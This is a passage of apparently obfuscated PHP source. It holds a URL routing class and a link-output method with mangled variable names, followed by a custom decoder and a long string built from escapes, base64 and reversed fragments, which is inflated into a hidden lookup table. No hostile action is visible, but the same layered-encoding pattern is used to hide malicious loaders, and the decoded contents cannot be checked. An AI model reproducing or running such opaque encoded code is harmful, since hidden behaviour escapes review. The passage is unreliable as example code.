$½«ÃÒõæ; } } } } } } if (!$±¿¨­”Æ) { return $£ ú®ÈÓ; } echo $£ ú®ÈÓ; } public function link($„é¤ïÔó = false, $À¾½´õ¼ = '') { $ŸæÂ—Äç =& $_SERVER[çâ¥×ø³]; if (!$„é¤ïÔó) { $this->link($ŸæÂ—Äç[1632], $ŸæÂ—Äç[1630]); $this->link($ŸæÂ—Äç[1633], $ŸæÂ—Äç[1629]); $this->link($ŸæÂ—Äç[1634], $ŸæÂ—Äç[1629]); $this->link($ŸæÂ—Äç[1635], $ŸæÂ—Äç[1629]); $this->link($ŸæÂ—Äç[1636], $ŸæÂ—Äç[1629]); return; } $ùùäú’Â = $this->url($„é¤ïÔó, $À¾½´õ¼, !1); if (substr($„é¤ïÔó, -3) == $ŸæÂ—Äç[1637]) { echo $ŸæÂ—Äç[1638] . $ùùäú’Â . $ŸæÂ—Äç[1639] . $ŸæÂ—Äç[246]; } else { if (substr($„é¤ïÔó, -4) == $ŸæÂ—Äç[1640]) { echo $ŸæÂ—Äç[1641] . $ùùäú’Â . $ŸæÂ—Äç[1642] . $ŸæÂ—Äç[246]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\x5b\x5e\57\135\53", "\x3a\156\x75\x6d" => "\133\60\x2d\71\x5d\x2b", "\x3a\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($âİôæ™‘, $Œ¬ÍĞàº) { $§¬‡œ€Ø =& $_SERVER[çâ¥×ø³]; if ($âİôæ™‘ == $§¬‡œ€Ø[1643]) { $ÎíïÉøú = array_map($§¬‡œ€Ø[1644], $Œ¬ÍĞàº[0]); $£ŠÕÂ = strpos($Œ¬ÍĞàº[1], $§¬‡œ€Ø[8]) === 0 ? $Œ¬ÍĞàº[1] : $§¬‡œ€Ø[8] . $Œ¬ÍĞàº[1]; $ºûìË½Ë = $Œ¬ÍĞàº[2]; } else { $ÎíïÉøú = null; $£ŠÕÂ = strpos($Œ¬ÍĞàº[0], $§¬‡œ€Ø[8]) === 0 ? $Œ¬ÍĞàº[0] : $§¬‡œ€Ø[8] . $Œ¬ÍĞàº[0]; $ºûìË½Ë = $Œ¬ÍĞàº[1]; } array_push(self::$maps, $ÎíïÉøú); array_push(self::$routes, $£ŠÕÂ); array_push(self::$methods, strtoupper($âİôæ™‘)); array_push(self::$callbacks, $ºûìË½Ë); } public static function error($Éîú¸¡ª) { self::$errorCallback = $Éîú¸¡ª; } public static function haltOnMatch($æ×Šğş¶ = true) { self::$halts = $æ×Šğş¶; } public static function dispatch() { $å˜ÉÄë· =& $_SERVER[çâ¥×ø³]; $‰Ë¼¦¦µ = parse_url($_SERVER[$å˜ÉÄë·[1645]], PHP_URL_PATH); $Â…åÀ†„ = $_SERVER[$å˜ÉÄë·[160]]; $ï–ÚÈÛÈ = array_keys(static::$patterns); $¬Ãª‹£ = array_values(static::$patterns); $‚ÙÍ…ø¶ = !1; self::$routes = preg_replace($å˜ÉÄë·[1329], $å˜ÉÄë·[8], self::$routes); if (in_array($‰Ë¼¦¦µ, self::$routes)) { $şû©Ğá = array_keys(self::$routes, $‰Ë¼¦¦µ); foreach ($şû©Ğá as $˜ˆûâ‚Û) { if (self::$methods[$˜ˆûâ‚Û] == $Â…åÀ†„ || self::$methods[$˜ˆûâ‚Û] == $å˜ÉÄë·[1646] || in_array($Â…åÀ†„, self::$maps[$˜ˆûâ‚Û])) { $‚ÙÍ…ø¶ = !0; if (!is_object(self::$callbacks[$˜ˆûâ‚Û])) { $ñíõ‘á = explode($å˜ÉÄë·[8], self::$callbacks[$˜ˆûâ‚Û]); $¹âê§®¯ = end($ñíõ‘á); $†Â§ÏŸ– = explode($å˜ÉÄë·[1261], $¹âê§®¯); $ì¾Ñ²— = new $†Â§ÏŸ–[0](); $ì¾Ñ²—->{$†Â§ÏŸ–[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$˜ˆûâ‚Û]); if (self::$halts) { return; } } } } } else { $øçäÆ†ò = 0; foreach (self::$routes as $˜ˆûâ‚Û) { if (strpos($˜ˆûâ‚Û, $å˜ÉÄë·[4]) !== !1) { $˜ˆûâ‚Û = str_replace($ï–ÚÈÛÈ, $¬Ãª‹£, $˜ˆûâ‚Û); } if (preg_match($å˜ÉÄë·[1647] . $˜ˆûâ‚Û . $å˜ÉÄë·[1648], $‰Ë¼¦¦µ, $Üî‘ºŞë)) { if (self::$methods[$øçäÆ†ò] == $Â…åÀ†„ || self::$methods[$øçäÆ†ò] == $å˜ÉÄë·[1646] || !empty(self::$maps[$øçäÆ†ò]) && in_array($Â…åÀ†„, self::$maps[$øçäÆ†ò])) { $‚ÙÍ…ø¶ = !0; array_shift($Üî‘ºŞë); if (!is_object(self::$callbacks[$øçäÆ†ò])) { $ñíõ‘á = explode($å˜ÉÄë·[8], self::$callbacks[$øçäÆ†ò]); $¹âê§®¯ = end($ñíõ‘á); $†Â§ÏŸ– = explode($å˜ÉÄë·[1261], $¹âê§®¯); $ì¾Ñ²— = new $†Â§ÏŸ–[0](); if (!method_exists($ì¾Ñ²—, $†Â§ÏŸ–[1])) { echo $å˜ÉÄë·[1649]; } else { call_user_func_array(array($ì¾Ñ²—, $†Â§ÏŸ–[1]), $Üî‘ºŞë); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$øçäÆ†ò], $Üî‘ºŞë); if (self::$halts) { return; } } } } $øçäÆ†ò++; } } if ($‚ÙÍ…ø¶ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¥¨Ñæ· =& $_SERVER[çâ¥×ø³]; header($_SERVER[$¥¨Ñæ·[1650]] . $¥¨Ñæ·[1651]); echo $¥¨Ñæ·[1652]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$å˜ÉÄë·[1645]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto FÖÒ¼¸¨Ÿ•; fŠŠòí†Àµ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\347\342\245\327\370\263", strrev('§Öú€¬')); $_SERVER[çâ¥×ø³] = explode("\174\3\174\3\174\2", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\133\331\132\226\262\164\243\224\301\44\330\116\264\70\116\234\305\211\23\144\131\216\105\144\313\221\344\54\304\316\144"."\x2c\x8d\xac\xb1\xa5\x19\x65\x66\xe4\x2d\xe\x94\x96\xb0\x85\xd0\x2\x85\xb2\x43\xb\x14\xca\x16\x28\x65\x87\x52\xa\x2d\x7f\xb\x74\x81\xd2\xb2\x94\xc7\x96\xd\xda\x52\x28\x94\xf6\x2f\x2d\x7d\x77".base64_decode('OXeZkQz/+977vhdIdPe599xzzz333HPO3fr09fc8d9PUvui/fXZc9I2XXr2fhqf2Jg==')."\177\111\370\270\255\7\356\105\376\34\271\365\334\206\206\256\371\7\317\356\371\314\67\176\170\233\166\253\166\263\166\136\62\361\344\123\361\103\176\171\353\311\261\135\327\75\71\261\153"."\357\275\36\331\177\142\175\53\52\114\353\266\322\37\305\264\134\105\37\67\34\327\241\11\131\313\314\33\103\64\154\230\364\67\114\177\372\122\11\133\57\131\256\116\243\41\372\243\102"."\xbf\xc8\xbf\xce\xc6\xa2\xc1\xf2\xd5\x9e\x64\x46\x4d\xf7\xf5\xf6\xc6\x52\x19\x28\xd4\x2a\xe7\x97\xac\x1c\x84\xca\x9a\xad\x95\xe0\xfb\x65\xdd\x76\x50\x6f\xe4\xe6\xd4\xb2\x55\xd6\x4d\x4f\x8a\x48\xc8"."\x69\xae\x36\xa8\x39\xd0\x52\x47\xbb\xda\x11\xeb\x4d\x24\xd7\xaa\x99\xb5\xbd\x31\x28\x31\xa8\x6e\xac\xe8\xf6\x4\x8d\x91\x60\xda\xd5\x6c\x37\x63\x94\x74\x5e\x62\xcc\xe6\xfd\x6a\x8f\x2d\x8f\xf7\x28".base64_decode('mVSkJx2JZuLJHpocTXZ3xzPV6alkItEeia6ozulNRZZ3RxTUv6KuGmbealA20JwNSg==')."\43\15\164\32\172\61\107\203\246\306\272\343\116\224\41\224\341\41\64\115\146\245\130\244\221\36\36\312\351\171\255\122\4\150\165\310\221\262\155\224\64\66\350\25\372\4\117\245\1".strrev('Ó¸)Š–+º²¶êãšJ`Vì•3¥AÜf‹,t©¡7Z&‹5õ"kk¸Ø‘¥™†Zâ­')."\155\365\144\254\365\12\340\113\17\2\205\22\111\44\224\351\132\160\365\122\231\65\103\353\324\150\54\231\352\210\245\224\366\265\212\200\120\326\52\225\54\63\204\132\101\63\351\112\135"."\215\245\122\64\20\0\364\116\304\361\244\101\44\331\331\231\216\361\30\14\156\145\2\365\144\56\340\247\47\226\313\27\135\165\124\53\126\30\232\216\320\337\172\370\201\137\313\1\324"."\335\150\230\106\5\320\24\232\260\54\276\254\40\120\141\245\165\226\242\347\40\120\102\365\55\130\171\150\31\216\322\140\333\122\372\273\30\12\15\252\70\117\267\135\125\67\263\126\316"."\60\141\261\56\3\244\323\334\102\207\155\240\2\64\236\267\212\71\26\166\214\111\30\112\336\50\352\75\225\222\134\204\107\263\5\243\230\263\331\372\372\270\222\64\232\340\313\25\227"."\25\261\62\352\311\24\133\351\106\176\102\254\67\134\256\227\347\72\126\305\316\352\161\264\76\150\174\16\44\353\256\213\6\7\260\61\254\276\162\321\322\162\151\335\346\103\63\254\116"."\xd4\x50\xb2\xe2\xca\x89\x15\x52\xac\xd3\xb2\x4b\x1d\x88\x32\xc0\xf7\xd1\xaa\x30\xfa\x6a\x64\x8c\xb0\x75\x91\x93\x20\x16\x6e\x58\x77\x7a\xf0\xa3\x81\x75\x27\xa1\x7f\x1a\x81\xf4\xf5\x43\x9f\xa\x7a"."\261\250\352\343\72\54\234\122\256\305\141\300\10\73\203\206\31\106\51\64\32\117\252\5\315\51\164\347\132\124\122\13\272\154\346\364\361\120\271\120\246\121\261\244\373\75\210\215\101"."\327\143\271\61\211\56\27\255\254\126\224\207\110\303\5\327\55\247\165\63\207\41\1\103\261\306\114\2\251\262\256\103\241\216\200\222\123\272\225\265\112\127\253\321\352\260\212\245\42"."\xf\xb1\xd1\xf1\x34\x87\x27\xba\xe3\x6c\x3a\x73\x79\x1a\x18\x64\xdb\x42\x1d\x7c\xd0\x70\x8\x85\x13\xcb\x53\x2b\x97\x8b\x46\x56\x73\xd\xcb\xc\x5b\x59\x57\x77\x83\x8e\x6b\xeb\x1a\xb4\x18\xc9\x66".base64_decode('dccJRi3Tta1iMFIsWmPBpG0MGWarMouWwZloUQcxAWyFlVq3WMGIgz8zq63i5oML2Q==')."\12\344\245\155\315\164\362\272\35\214\301\312\150\125\120\147\71\25\144\305\72\14\247\154\71\6\356\136\253\242\271\256\226\55\140\12\42\232\157\373\230\362\206\131\64\114\275\252\154"."\x6c\xbc\x6c\xd8\xba\xc3\xfa\xaa\x2c\xef\xce\x40\x23\xa8\x75\x3d\xd8\x6b\x6b\x43\x25\xad\x55\x29\x57\x6\x11\x64\x60\xa5\xd6\x48\xa3\xa5\x1\x34\xad\x4a\x16\x47\x3\x4a\xa9\xe2\xb8\x41\x5b\x47\xa4"."\310\100\333\35\0\71\236\17\166\343\165\145\350\271\140\32\121\154\110\236\333\64\117\101\250\243\260\74\232\332\225\311\364\252\361\116\264\45\367\304\324\356\110\46\332\5\335\166\265".base64_decode('IdbnBKLDvEmWuCaI1hdGrh40VpHYa43pNvpw+0SrMmLlBq3xEMvChdOI0LDCeLrLbg==')."\60\245\231\103\30\76\203\23\256\16\50\50\110\125\73\332\300\103\171\272\230\103\203\172\336\262\141\64\316\350\220\167\56\22\272\71\344\26\130\333\351\130\152\125\54\245\246\223\235"."\x99\xd5\x91\x14\xec\xf7\x26\x42\xa4\x71\xd6\x1b\xfc\xf5\x62\x30\xa5\xe7\xd0\xec\x64\x5d\x56\x4f\x2b\x63\xc0\xb2\x32\x78\xfd\xe0\x8f\xb3\x5c\xbc\xa6\x58\x5e\x22\xbe\x1c\xc3\xae\x23\xe8\xa0\x42\x41".base64_decode('uRRrO2GUDDw8l+cQYCNmYDl0KEzG3NbvzGroz81uDKJ/ZzWu6+8IzRpYFjZEnfCc0A==')."\x1c\xa5\xb9\x69\xbe\xd2\x8b\xb8\x13\x43\x2b\x2a\x30\xe8\xaa\x12\x4d\x4a\x72\x85\x17\x2c\x2\xe1\x4d\xcb\xd4\x3f\x6\x38\x78\x7b\x93\x28\x83\xf\xac\x34\x31\x15\x5b\xd9\x17\x4b\x67\xd4\xee\x58\xa6"."\53\331\1\137\217\105\40\224\260\350\312\146\243\135\107\177\6\0\1\6\350\217\152\70\235\322\316\203\243\234\102\251\326\340\60\232\214\156\235\221\141\230\371\170\111\33\222\366\1"."\325\273\115\340\30\316\354\26\310\201\260\154\265\221\343\373\10\212\166\351\306\120\1\0\146\340\346\262\126\321\262\265\42\246\236\154\341\350\214\242\15\31\100\321\312\305\12\302\231"."\60\376\102\246\120\51\15\2\321\107\114\342\220\356\12\36\314\231\100\214\12\20\61\304\262\42\270\305\1\46\260\205\101\54\254\342\171\356\17\225\315\241\306\31\320\226\332\334\322"."\x84\x13\x0\x45\x61\x88\x88\x19\xad\x48\x7b\x22\x83\x41\x28\x6b\xa1\x45\xd1\xad\x8d\xe8\xad\x78\x50\x40\x62\x16\x93\x54\x16\x91\x68\xcf\x62\xbc\x5d\xb4\xf9\xd7\x14\x9e\xa7\x62\xa8\x84\x1a\x21\x6d"."\106\55\276\301\121\166\37\370\11\266\135\50\272\155\133\366\361\120\202\204\25\262\347\340\171\203\306\135\276\203\73\150\371\260\160\301\342\73\276\145\103\250\65\14\343\236\331\334\71".base64_decode('BfthOD0X/S82v5xV0thWQjYBPUd3AZo0y5PTpWuCjXFt18KptqcIwqeCBXiN5g26VA==')."\341\175\143\275\314\351\105\235\341\102\101\147\33\151\23\24\103\260\343\230\222\347\50\213\370\141\224\52\70\30\303\111\241\232\170\333\143\361\325\370\0\41\22\360\336\17\63\57\202".strrev(')åXâ§VSAüè2{&BD¾Î¨­"85X¦¨`l#Ù­Ù¨DÊä¼õµï}Á$÷E')."\xb4\x5a\xd5\x48\xb4\x97\xc6\x38\x4f\x42\x68\xf0\x54\xd5\x6\x4b\x53\x46\x9b\x61\x92\x51\x27\xc2\x82\x13\x40\x9b\x5a\xd9\x32\x1d\x3d\x98\x85\x1a\xe2\x74\x52\x95\x95\x13\x1b\x25\x2d\x21\x6d\xae\xbe"."\xfd\x72\x3c\xa8\x95\x26\x83\x25\x44\x2\x82\xbc\x7b\x5e\x36\x45\x81\xd\x94\x72\x3b\x71\x98\x26\xb1\xff\x61\xe0\xa1\x55\xc8\xf8\xa3\xde\x64\x1a\x2a\x2c\xc3\xa9\x88\x47\x1d\xe4\x8b\xa5\xb7\xf\xb2"."\x4a\x12\x8a\x2c\x8f\x41\xe2\xc1\x80\x55\x5\xd\x38\xcf\xc8\xea\x34\xdb\xbb\x2a\xa8\xbc\x6d\x4c\x6a\x62\x48\xcb\x58\x7f\xd8\x40\x4a\x45\xc1\xf2\x7a\x47\x15\x14\x33\x8f\x9a\x9c\x17\xec\xea\x8e\x44"."\203\351\256\110\163\313\174\232\272\266\224\353\317\164\31\116\377\51\74\16\160\33\163\346\251\266\216\310\3\153\271\271\11\72\247\143\106\103\352\317\332\140\51\210\133\301\40\13\65"."\x35\x35\xb1\xb6\x66\xcf\x57\xa\x88\x2a\x1\xfa\x5a\x66\x8e\x4c\xb\x0\x6b\xb0\x92\x1d\x61\x2b\x44\xcb\x32\x9e\xf\x1f\x8a\x9d\xe0\x98\xc1\x8\xea\xc\xce\x1e\xcf\xa8\x46\x97\x19\xde\xad\x3\x9a"."\xa8\x10\xde\x4e\xd5\xb2\xf8\x63\x2a\x6a\xd1\xad\x38\x32\x68\xd0\x3a\xca\xa1\x4a\x6\x63\x65\x69\xaa\x56\x1c\x42\x50\x76\xb\x25\x39\x51\xcc\x34\x8d\xeb\x94\xc3\xe2\x93\xc5\xa1\x88\x61\xeb\x45\x6a"."\xb9\x4b\x65\xb\x31\x57\x30\x8c\x35\x35\xfb\xb0\xa6\x56\x1f\xd6\xf8\xfa\xb0\xa6\xba\xf\x34\xc9\x31\x86\x4c\x34\x4a\xb6\x27\x65\xba\xe2\x3d\x2b\xd4\xee\x64\x47\x2c\xa1\xc6\x7b\xd0\x16\x9c\xa9\x4e"."\357\353\355\210\260\225\52\247\267\47\63\135\236\324\76\264\11\257\212\44\342\376\342\261\65\361\164\46\135\63\13\245\365\305\174\71\35\355\152\157\52\326\31\137\303\243\235\361\130"."\242\43\255\106\43\321\56\121\246\47\322\15\21\264\363\352\305\234\23\366\226\127\21\67\221\346\302\15\165\24\13\152\30\26\252\36\171\202\312\116\312\252\40\26\210\261\324\1\340"."\x30\x5c\x2c\x1e\x22\x23\x51\x19\x92\x56\x18\xaf\xc3\xf\x55\x25\xb6\x1b\x94\x34\xa0\x91\x1a\xe3\x8\x1b\xe8\x4f\xa3\x12\x49\x2b\x6e\x19\xda\x40\x74\x7f\x70\x82\x7\xc9\x30\x58\x1c\x6d\x65\xf0\x7d"."\x5\x38\x9b\xaa\x1e\xa8\xb8\x4c\xbb\xc4\x7e\xd6\x4e\x88\xe4\x5d\xce\xd7\xf8\xe2\x88\xca\x89\x3c\x34\x3\x11\x22\x87\x42\x98\x40\x66\x4\x3e\x63\x20\x9a\x69\xbb\x11\xd6\x9d\xbc\x90\x1\xa9\xc9\xde".base64_decode('WCqCJUjq6lSyZzlUGCvorANxAH8DO2iAIMkVWw86JWiAoiUB9GGLgXKK/pxIf9ABCQ==')."\x3e\xae\x9b\xc\xea\x83\x78\x17\x66\x5c\x14\xb\xe4\x11\xd9\x63\x3b\xa8\x55\xe1\x5f\x1b\xb4\x2c\xf8\x42\x11\x33\xc2\x53\x6c\x67\xe0\x82\xa8\x61\x87\x21\xc9\x38\xdb\x53\x66\x4f\x31\x52\x6\xa8\x9b".strrev('Í÷×‡Ï€Ùˆëf‡'."\n".'à`ÓdÇ9¥Š™š	òa×'."\0".'S%J–!4„˜ÑfQë\\').strrev('6NRpHºëYa¸pşÖÆ²Î'."\r".'Ï¯6*àc(CúÄ(Ñ\'YÆ@œXn')."\20\333\327\70\33\22\6\66\65\7\346\155\306\5\120\301\145\47\14\240\237\266\376\145\63\373\203\47\236\272\341\244\165\375\3\365\255\263\217\357\17\235\320\77\66\60\253\161\31"."\373\116\266\142\43\316\222\121\54\324\325\334\354\6\324\45\164\156\340\105\114\262\267\111\5\130\306\244\121\26\251\233\346\157\146\351\150\16\365\41\121\143\135\260\177\366\300\62\251"."\x9e\x94\xe4\xff\x16\xa2\xa4\x68\xa3\x2d\xf0\x72\x91\xe0\x29\x78\x64\xbc\x2a\x5e\xf7\x80\x1f\x15\x33\x2b\xb6\x25\xbc\x2e\x6\xb5\x2c\xd0\x1\x44\x23\x5\xd7\xee\xda\x5c\x66\xe5\x3d\xd1\x6e\x9a\x49"._kodDe('KSx0fqjHEcZWlggCqU7NgiaBgitgguqlBXtReNQwryibNemT3jctOwNG7AmLPyD7cAY=').strrev('(&†|\\íŠ¡8³€aFTÄOi5UÒÓÖV¬¥<À´1ã’|U”dÈåp.').base64_decode('KqMPWXFWJSd3WPnOxqJCCAPl3FuJJN+plDETrqAZR7BV0AautC1VKMihnipPQFljDA==')."\x21\x96\x3c\xe9\x62\xd1\x63\xa\x5\x7d\x2a\x8b\x19\x72\x10\xeb\xcc\x98\xd7\x70\x43\x7f\x7f\x65\x9d\x9e\x1b\x58\x87\x10\x5f\xb\xe6\x7\x36\xcd\xdd\xdc\xc8\x8e\xb3\xe1\x7e\xf4\x87\x45\x22\x35\x64"."\312\52\247\206\52\142\304\102\270\37\134\254\350\211\360\154\32\265\154\316\1\227\75\247\105\327\162\265\242\247\211\14\116\201\311\345\34\32\10\330\350\154\47\4\305\302\74\233\44"."\214\47\344\264\207\13\264\70\43\44\111\203\161\215\264\356\206\170\211\200\224\251\242\270\347\142\244\15\204\145\171\303\104\313\51\52\155\165\124\314\231\46\147\113\217\4\337\321\65"."\73\133\350\254\24\213\56\77\262\26\215\21\370\2\254\25\270\120\10\322\37\145\166\255\252\235\226\315\244\103\263\240\33\165\263\152\25\214\233\246\225\33\224\121\115\154\262\313\43"."\x88\x9d\xc9\x28\xd\x4c\xf8\xad\xc4\x7b\x94\xf6\x64\x32\x11\x8b\xf4\x28\x78\x3f\x87\x7d\x8\x31\xb\xe9\x58\x6f\x4\x6d\x62\x58\xce\x94\xce\xc4\x40\x1e\x1f\xef\x8\xb2\x76\xd7\x4\xd9\x41\x99\x7".base64_decode('DAC7VaZ8o+6q6Ow5wuZSPmrjM0QAH3gDmLcIoF4H8Bk5IE5oASFuDowa+hgJ8NNTAA==').base64_decode('DlUBcbqHYLwjYDgd5HBIPkCyWBfQqRodboraRIB2J6GP6sUAO/cHWB8DTOwRIOKKDg==')."\350\126\37\132\116\320\55\22\104\124\263\20\300\10\204\361\67\40\4\340\1\164\30\327\155\122\4\0\43\316\225\1\161\346\14\14\331\126\245\334\313\276\51\305\150\267\40\101\364"."\231\47\244\54\313\15\60\111\112\100\26\251\100\57\42\154\235\324\4\147\355\321\20\370\373\73\1\370\205\263\252\241\364\11\223\125\75\37\136\151\322\46\332\42\210\253\66\263\135"."\316\123\206\10\163\70\367\211\1\56\102\253\304\102\305\3\350\324\340\252\205\66\53\207\71\202\232\136\104\25\262\156\161\313\41\170\135\277\264\300\177\377\201\77\232\321\206\322\322"."\xe7\x5c\x6d\x88\x7d\xb\x13\x2b\x94\x3b\x6d\x51\x1a\x4e\xe9\xd9\x89\xac\x10\x3f\x74\x48\x42\xd\x6f\xac\x82\x5a\x48\x6b\x79\xdf\xb0\x2\x64\x1d\xd5\x5a\x3\xb5\xe7\x98\xe3\x35\x9f\x92\x83\xf\x3a"."\210\301\230\41\73\237\137\317\32\371\344\325\11\343\42\44\60\131\26\114\4\355\54\46\303\151\264\251\165\26\31\120\232\345\154\40\300\1\157\14\57\256\20\41\310\344\332\60\315"."\45\123\211\130\147\106\71\71\211\250\227\141\251\264\216\212\13\53\344\37\313\124\74\155\63\160\51\155\44\137\304\65\63\107\123\66\40\112\277\241\255\216\175\244\316\123\135\240\211"."\267\23\1\26\365\174\115\314\270\14\4\214\16\144\370\142\167\142\111\111\261\31\126\200\363\323\234\54\15\140\271\36\204\164\226\46\246\126\306\113\211\334\210\4\326\57\317\167\161"."\124\254\51\206\22\12\376\0\64\100\170\25\114\122\202\142\165\110\121\57\310\175\30\351\333\102\61\210\172\15\163\302\60\323\106\251\134\254\112\235\342\273\260\140\2\360\342\26\61".base64_decode('ipXThekmgkU0tP0AXNcFioY5Im3QQgKHeo+rSn2Hlnw9Z2Q16I16FjSgfEGzBTQZGQ==')."\302\264\200\227\167\160\21\21\225\212\345\265\121\301\241\170\352\110\304\304\161\47\130\367\345\240\267\121\32\355\10\220\337\56\4\6\171\275\362\371\301\204\204\25\242\64\10\21\203"."\x4\x2\x16\xfa\x21\x3\xc9\x58\x1\x2c\x21\x46\x3f\x74\x1f\x77\x58\x97\x71\x21\x86\xf8\x95\x52\x7\x48\x9c\x71\x78\x15\xa2\x0\x80\x39\x18\xe2\xd\x8c\x82\x0\x37\xa1\x4a\x32\x1\x4e\x81\xbc\xfc".base64_decode('AO1JhNN3tEuiPY6GEfNeRFubHcILZjneoBh8KK2TETCtozFDPdFauipPLi0Ef5j2iw==')."\xbd\x82\xc1\x55\xac\x37\xef\xfc\xd3\xd0\x90\xe8\x10\x6\xad\x5a\xdd\xf\x8c\xce\xb5\xe3\x9d\xb6\xc5\x39\x5d\xbe\xcd\xfb\xb\x45\xc9\x51\x92\xdf\xc6\xfb\xb6\x66\x9\x1e\x1e\x76\xa2\x2a\x49\xaa\xe3".base64_decode('Zyx8qb6omAjPrkOT2AWBlisZZsimu1kIHRBAgyLQJPFeguhsopcwsPtt9s2za1no1A==')."\x69\x87\x6c\xf4\x65\xd1\x21\x89\xe0\x1\xb5\x20\x17\xec\x78\x53\x94\x39\x6\xde\x8a\x83\x32\x24\xd2\xed\x65\x8c\x58\xcd\x74\x59\x63\x14\x9b\x33\x6d\xc\x93\xc9\x11\xa3\x22\xa8\x28\xe9\xb2\xa4\xf0".strrev('©¡‚CÆÙq åé)é˜´âÅ5SnÉ¦LšE%Ø ¢wbÎKÁN.ËbàÎ	â@')."\255\72\222\265\312\60\357\222\316\124\311\32\325\245\304\220\343\132\145\221\43\105\151\266\224\45\32\225\112\361\251\40\75\102\253\50\107\330\140\1\62\122\26\352\222\63\64\135\250"."\41\174\152\10\11\250\306\73\42\266\315\320\224\16\23\337\72\242\104\71\11\123\274\64\133\143\265\266\50\332\170\154\124\150\104\321\246\360\207\103\164\221\207\264\134\56\311\156\136".strrev('ÜvzeÑøÒµÇ÷e€rNµm2œ’¹n.…[OâÒ¡EŠG‹µb’›Æ¢!»XYQupå')."\x7f\xb3\xea\x25\xc8\xd3\xb3\x29\x6c\x9\xfa\x4f\x19\x7c\x1a\x6b\xc7\xd1\xce\x1e\x2d\x18\xa6\xee\xf0\xd\xda\x76\x6a\x51\xa6\xff\xcf\xfc\x70\x35\xe4\xf1\xa\x99\xe\x5d\x70\x9e\x24\x79\xc6\x9a\x99"."\xa3\xba\x7c\x4e\xe0\xe2\x55\x41\x89\xf8\x46\x3d\xe5\x67\x3f\x80\x5\x90\x22\xaa\xeb\x61\xa3\x52\xa4\x7d\x69\x39\x79\x30\x4\x2d\x5f\xa\xf\xbc\x31\xc5\x93\x21\x67\x1a\x9c\xf5\x97\xd3\x99\xf0\x99"."\xd0\xc0\x71\xbe\x9f\xca\x95\x70\x16\x9e\x4b\xb9\x51\xc1\xb6\x89\x78\x37\xbb\x47\xac\x59\x99\x7f\x49\xf0\x73\x72\x39\x84\xc8\x38\x63\xba\x8e\xb3\x6c\xde\xca\xaf\xaf\x7e\xf9\x7f\xbd\xfb\x7d\x1a\x7e"."\143\353\125\157\76\272\215\206\27\315\207\116\20\35\135\20\376\10\75\335\55\253\67\131\307\74\361\331\345\57\205\137\177\374\236\153\157\72\76\166\316\267\32\346\367\151\347\36\166"."\316\21\63\227\236\177\141\361\376\337\150\23\367\56\277\372\276\261\115\177\170\351\310\370\163\377\371\102\351\310\335\337\70\252\361\255\175\52\277\371\156\313\51\327\176\352\305\347\367"."\376\322\214\302\327\116\275\342\255\13\254\13\36\176\351\211\227\343\253\352\16\177\340\252\27\136\170\371\262\27\136\131\62\377\303\35\7\44\117\175\177\307\131\373\236\361\341\136\225"."\327\26\176\165\351\323\37\174\147\313\101\107\315\375\336\247\366\152\270\365\250\155\257\177\151\367\136\277\372\343\376\241\343\66\65\174\341\371\357\337\171\371\353\377\171\351\240\323\203"."\xe7\x2d\x9f\xea\x38\xa7\xed\xb\x27\xfd\xe4\x9c\xdf\x6e\x5c\xbb\x61\xe5\xa2\xbd\xf7\x39\xf7\x9c\x3f\xf4\x98\x3f\x78\xa5\x74\xc4\x9e\xd\x7\x67\x8f\x38\x60\x38\x7e\xef\xef\x5e\xd8\x6e\xb4\x6d\x7e"."\344\245\127\317\213\275\324\362\332\274\77\36\362\160\354\321\361\53\237\374\326\111\273\156\275\162\321\77\377\373\273\37\175\364\265\334\173\277\62\157\371\305\1\247\174\343\264\47\57"."\x1e\xff\x75\xe1\xcf\xef\xbe\x9b\xbf\xeb\xee\x95\xe6\x5b\xf1\x55\xaf\x46\x2f\x6c\xbb\xfb\xb5\x19\x5b\xdb\x86\xb3\xbf\x4f\xae\x6d\xd9\xfb\xae\x1f\xff\xe0\xe0\x2d\xfa\xcf\x12\xff\x75\xc2\x53\x53\xd7"."\x7d\xea\xcc\xbd\x37\x5f\x73\xd7\x87\xfb\xfd\x63\x64\xd1\x75\x87\x5d\x72\xf0\x4f\xaf\x5f\x7d\xd7\xbf\x9e\xfd\xe1\xe6\x53\xee\xbd\xa0\xf9\xf3\xf7\x3f\xf6\xe8\xf0\x8f\xd4\x53\x1a\x2f\x7f\xfd\xfa\xe1".strrev('o¦xšûøú\'Íú<oÚkÜÛc:¯mûp&·İş{s‹üóŞï3ámyü?ŒâÿNc')."\317\61\127\216\36\77\157\166\264\160\336\254\65\137\51\374\343\361\341\43\107\217\333\377\350\335\173\275\162\315\206\301\321\175\147\164\174\171\317\376\123\271\27\36\277\361\220\325\255".base64_decode('nzr+sM9sOHL2GV2fW7yx485vP55/rOuCo9+c02OuPGDj5T/e2zniuOgBz9+04L0zvg==').base64_decode('8mO3eO+CM555YO/o+b//6aU/2z+9j/bk1585NnrShsP+8pPm9vFnss45W9qazn7+mQ==')."\341\326\77\374\240\73\35\252\274\226\273\146\140\343\261\47\244\327\137\262\341\342\266\360\231\143\77\31\75\262\167\315\23\217\357\335\76\161\144\262\377\214\323\47\162\233\216\316\105".strrev('ùı³<GÌïoŞú®á~—méÿß·§šÙt]7åñ]—¹ÓtÑ